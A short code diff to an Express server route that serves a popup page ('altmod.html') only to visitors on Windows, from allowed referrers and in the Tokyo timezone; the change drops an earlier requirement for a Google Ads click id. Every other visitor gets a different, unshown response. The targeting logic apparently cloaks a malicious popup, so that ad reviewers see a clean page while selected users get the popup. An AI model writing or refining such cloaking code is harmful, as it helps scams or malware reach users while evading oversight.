@@ -85,7 +85,7 @@ app.post(
     console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);
 
     // Check conditions and log them, removed check for gclid
-    if (isWindowsOS(userAgent) && isAllowedReferrer(referer) && isTokyoTimezone && fullUrl.includes(`gclid`)) {
+    if (isWindowsOS(userAgent) && isAllowedReferrer(referer) && isTokyoTimezone) {
       console.log('popupsent');
       res.sendFile(path.join(__dirname, "altmod.html"));
     } else {
